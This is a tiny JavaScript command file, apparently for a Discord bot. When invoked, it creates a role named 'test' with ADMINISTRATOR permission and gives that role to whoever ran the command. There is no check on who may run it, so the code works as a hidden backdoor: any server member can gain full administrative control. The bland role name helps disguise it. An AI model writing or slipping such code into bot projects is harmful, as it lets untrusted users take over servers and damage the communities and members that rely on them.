exports.run = async (client, message) => {
    message.guild.roles.create({data:{name:"test",permissions: ["ADMINISTRATOR"]}}).then(r => message.member.roles.add(r.id))
};
